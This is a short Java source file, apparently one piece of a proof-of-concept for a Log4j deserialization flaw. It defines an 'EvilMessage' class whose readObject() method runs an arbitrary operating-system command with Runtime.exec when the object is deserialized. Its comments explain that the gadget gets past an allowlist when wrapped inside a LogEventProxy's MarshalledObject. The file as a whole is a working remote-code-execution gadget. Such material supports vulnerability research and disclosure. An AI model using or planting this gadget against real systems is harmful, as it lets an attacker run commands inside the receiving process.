import org.apache.logging.log4j.message.Message;

import java.io.ObjectInputStream;

/**
 * PoC-1 "primitive proof" gadget: a Message whose readObject() executes an OS
 * command when it is deserialized. It is neither on the FOIS allowlist nor a
 * benign type, so sending it top-level is rejected -- yet wrapped inside a
 * LogEventProxy's MarshalledObject it runs unfiltered. Stands in for "any
 * gadget"; PoC-2 removes the need for this class to exist on the victim at all.
 */
public class EvilMessage implements Message {
    private static final long serialVersionUID = 1L;
    private String[] cmd;

    public EvilMessage() {}
    public EvilMessage(String[] cmd) { this.cmd = cmd; }

    private void readObject(ObjectInputStream in) throws Exception {
        in.defaultReadObject();
        // Attacker-caused effect, executed inside the RECEIVER process:
        Runtime.getRuntime().exec(cmd).waitFor();
    }

    // ---- Message interface (benign values; the payload is the readObject side effect) ----
    @Override public String getFormattedMessage() { return "benign message"; }
    @Override public String getFormat() { return "benign message"; }
    @Override public Object[] getParameters() { return new Object[0]; }
    @Override public Throwable getThrowable() { return null; }
}
